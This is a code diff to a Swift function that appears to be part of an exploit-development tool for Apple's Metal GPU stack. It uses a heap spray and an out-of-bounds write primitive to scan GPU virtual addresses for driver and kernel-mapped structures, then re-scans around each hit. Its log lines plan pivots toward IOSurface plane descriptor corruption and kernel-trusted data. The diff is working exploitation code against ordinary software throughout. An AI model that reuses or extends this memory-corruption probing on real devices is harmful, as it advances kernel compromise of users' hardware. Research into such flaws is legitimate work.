@@ -3561,24 +3561,31 @@ func runGPUVAScan(log: FuzzLog, completion: @escaping () -> Void) {
         step("  useResource required for mapped reads: \(useResourceRequired)")
 
         // ── Phase 1: full-range scan (no useResource on targets) ──────────────
-        // Scan ranges: (base, stepPerThread, numDispatches)
+        // ── Phase 1: focused upward scan from the spray base ─────────────────
+        // Previous scan went BELOW 0x1500000000 (wrong direction).
+        // Driver PSO / command-queue allocations come from the SAME heap and land
+        // ABOVE our user spray (which starts at lo.gpuAddress = 0x1500000000).
+        // Three passes: fine (4KB) just above hi, medium (64KB) further up, coarse (1MB) far.
+        let sprayBase = lo.gpuAddress
         let ranges: [(base: UInt64, step: UInt64, dispatches: Int, label: String)] = [
-            (0x000000000,    0x80000,  64, "low  0–2GB"),
-            (0x100000000,  0x400000,  60, "pre  4–244GB"),
-            (0x1700000000, 0x400000,  64, "post 96–352GB above user"),
-            (0x4000000000, 0x400000,  64, "high 256GB+"),
+            // fine: immediately above spray — catches PSO shader binary, cmd-queue allocs
+            (sprayBase + 0x2000,   0x1000,  64,  "fine    +8KB–+264KB above spray"),
+            // medium: farther above spray — catches larger driver allocations
+            (sprayBase + 0x100000, 0x10000, 128, "medium  +1MB–+129MB above spray"),
+            // upper: well above user range — Metal framework private heap
+            (sprayBase + 0x8000000, 0x40000, 128, "upper  +128MB–+640MB above spray"),
+            // low: 0x0–4GB — AGX firmware IPC / shared memory
+            (0x0, 0x1000, 256, "low     0x0–1MB AGX firmware"),
         ]
 
         var totalHits = 0
+        var hitVAs: [UInt64] = []
 
-        func runRange(_ rng: (base: UInt64, step: UInt64, dispatches: Int, label: String),
-                      useResources: [any MTLBuffer] = []) {
-            step("── range: \(rng.label) step=\(rng.step/1024)KB ──")
+        for rng in ranges {
+            step("── \(rng.label) ──")
             for d in 0..<rng.dispatches {
-                let dispatchBase = rng.base + UInt64(d) * UInt64(NTHREADS) * rng.step
-                for t in 0..<NTHREADS {
-                    oobWriteVA(t, dispatchBase + UInt64(t) * rng.step)
-                }
+                let base = rng.base + UInt64(d) * UInt64(NTHREADS) * rng.step
+                for t in 0..<NTHREADS { oobWriteVA(t, base + UInt64(t) * rng.step) }
                 out.contents().initializeMemory(as: UInt64.self, repeating: 0, count: NTHREADS)
                 guard let q   = device.makeCommandQueue(),
                       let cb  = q.makeCommandBuffer(),
@@ -3586,7 +3593,6 @@ func runGPUVAScan(log: FuzzLog, completion: @escaping () -> Void) {
                 enc.setComputePipelineState(pso)
                 enc.setBuffer(hi,  offset: 0, index: 0)
                 enc.setBuffer(out, offset: 0, index: 1)
-                for r in useResources { enc.useResource(r, usage: .read) }
                 let sz = MTLSize(width: NTHREADS, height: 1, depth: 1)
                 enc.dispatchThreads(sz, threadsPerThreadgroup: sz)
                 enc.endEncoding()
@@ -3596,38 +3602,56 @@ func runGPUVAScan(log: FuzzLog, completion: @escaping () -> Void) {
                 for t in 0..<NTHREADS {
                     let val = outPtr[t]
                     if val != 0 {
-                        let va = dispatchBase + UInt64(t) * rng.step
+                        let va = base + UInt64(t) * rng.step
                         step("  ★ HIT VA=0x\(String(va, radix: 16)) val=0x\(String(val, radix: 16))")
-                        totalHits += 1
+                        hitVAs.append(va); totalHits += 1
                     }
                 }
             }
         }
 
-        for range in ranges { runRange(range) }
-
-        // ── Phase 2: narrow scan near user buffer zone WITH useResource ────────
-        // useResource on all owned spray buffers makes them visible; any gap between
-        // them that returns non-zero is a driver allocation not in our keepAlives list.
-        step("── phase 2: narrow scan 0x1500000000±256MB, step=4KB, useResource on owned bufs ──")
-        let narrowRange = (base: UInt64(0x1480000000), step: UInt64(0x1000), dispatches: 512, label: "narrow user zone")
-        runRange(narrowRange, useResources: keepAlives + [hi, lo])
+        // ── Phase 2: 4KB re-scan around each hit ──────────────────────────────
+        if !hitVAs.isEmpty {
+            step("── phase 2: 4KB fine-scan ±256KB around each hit ──")
+            for hitVA in hitVAs.prefix(8) {
+                let hitBase = hitVA > 0x40000 ? hitVA - 0x40000 : 0
+                for d in 0..<8 {
+                    let base = hitBase + UInt64(d) * UInt64(NTHREADS) * 0x1000
+                    for t in 0..<NTHREADS { oobWriteVA(t, base + UInt64(t) * 0x1000) }
+                    out.contents().initializeMemory(as: UInt64.self, repeating: 0, count: NTHREADS)
+                    guard let q   = device.makeCommandQueue(),
+                          let cb  = q.makeCommandBuffer(),
+                          let enc = cb.makeComputeCommandEncoder() else { continue }
+                    enc.setComputePipelineState(pso)
+                    enc.setBuffer(hi,  offset: 0, index: 0)
+                    enc.setBuffer(out, offset: 0, index: 1)
+                    let sz = MTLSize(width: NTHREADS, height: 1, depth: 1)
+                    enc.dispatchThreads(sz, threadsPerThreadgroup: sz)
+                    enc.endEncoding()
+                    cb.commit(); cb.waitUntilCompleted()
+                    if cb.error != nil { continue }
+                    let outPtr = out.contents().assumingMemoryBound(to: UInt64.self)
+                    for t in 0..<NTHREADS {
+                        let val = outPtr[t]
+                        if val != 0 {
+                            let va = base + UInt64(t) * 0x1000
+                            step("  [refine] VA=0x\(String(va, radix:16)) val=0x\(String(val, radix:16))")
+                        }
+                    }
+                }
+            }
+        }
 
         if totalHits == 0 {
             step("── scan complete: 0 hits ──")
-            if useResourceRequired {
-                step("  useResource IS required — GPU returns 0 for mapped VAs without it")
-                step("  driver allocations have no MTL handle → can't useResource them")
-                step("  PIVOT: IOKit Metal IPC region probe OR IOSurface plane descriptor corruption")
-                step("  next: check IOSurface plane descriptor layout for kernel-trusted backing data")
-            } else {
-                step("  useResource NOT required but no hits — driver VAs outside all scanned ranges")
-                step("  next: extend scan to 0x0–0xFFF at 4KB step (AGX firmware low region)")
-            }
+            step("  driver allocs may use storageModePrivate within process GPU VA space")
+            step("  or Metal heap is fully isolated from standard allocator range")
+            step("  PIVOT: IOSurface plane descriptor path — check kern-trusted data in backing pages")
+            step("  try: dump lo.contents() and first 512 bytes above hi for driver data patterns")
         } else {
             step("── scan complete: \(totalHits) hit(s) ──")
-            step("  ★ non-zero VAs = Metal driver / kernel-mapped struct candidates")
-            step("  next: 4KB step re-scan around each hit to map full struct layout")
+            step("  ★ non-zero VAs = Metal driver / kernel struct candidates")
+            step("  cross-ref with known GPU struct signatures to identify what's there")
         }
         step("── GPU VA Scanner complete ──")
         completion()
